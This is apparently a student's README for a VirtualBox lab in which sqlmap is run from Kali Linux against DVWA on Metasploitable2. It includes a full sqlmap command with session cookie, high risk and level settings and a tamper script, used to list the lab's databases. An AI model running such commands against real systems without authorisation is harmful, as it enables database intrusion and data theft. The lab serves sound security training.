### DVWA SQL Injection Testing

This project demonstrates how to perform SQL Injection vulnerability testing using sqlmap on the Damn Vulnerable Web Application (DVWA) hosted on Metasploitable2 and tested from Kali Linux.

##  Tools Used
- Kali Linux (Attacker)
- Metasploitable2 (Victim)
- Oracle VirtualBox
-  SQLMap — to detect and exploit SQL Injection vulnerabilities

  ## Lab Setup
- Oracle VirtualBox with two Virtual Machines:
  - **Kali Linux** (Attacker): `192.168.56.100`
  - **Metasploitable2** (Victim): `192.168.56.101`
- Network Configuration:
  - **Adapter 1:** Host-Only Adapter
  - **Adapter 2:** Bridged Adapter (for internet access)


    ### 1. SQL Injection with SQLMap
- URL: `http://192.168.56.101/dvwa/vulnerabilities/sqli/`
- Security Level: Low (I have mannualy set inside DVWA UI)
- Used:
  ```
  sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=612e9cdb3e43fd8056e95567265f6225" \
  --level=5 --risk=3 --random-agent --tamper=space2comment \
  --batch --dbs
  ```
- Extracted DB names like `dvwa`, `metasploit`, `mysql`, etc.

```
  ├── sqlmap/
│   ├── sqlmap_output.txt
│   ├── dvwa_table_list.txt
|   |── user_table_coloumn.txt
│   └── dumped_data.txt
└── README.md
```
